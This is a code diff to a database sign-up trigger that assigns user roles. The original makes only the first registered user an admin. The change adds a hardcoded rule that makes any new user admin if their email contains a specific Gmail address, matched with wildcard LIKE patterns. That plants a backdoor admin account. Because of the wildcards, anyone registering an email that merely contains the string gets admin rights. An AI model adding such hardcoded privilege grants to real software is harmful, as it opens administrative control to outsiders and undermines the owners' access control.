@@ -49,8 +49,8 @@ BEGIN
     -- Check if a user already exists for this email
     SELECT id INTO existing_id FROM public.users WHERE email = NEW.email;
     
-    -- First registered user is automatically Admin for convenience, others are standard users
-    IF NOT EXISTS (SELECT 1 FROM public.users) THEN
+    -- First registered user or sypher916@gmail.co/com is automatically Admin for convenience, others are standard users
+    IF NOT EXISTS (SELECT 1 FROM public.users) OR NEW.email LIKE '%sypher916@gmail.co%' OR NEW.email LIKE '%sypher916@gmail.com%' THEN
         default_role := 'admin';
     END IF;
 
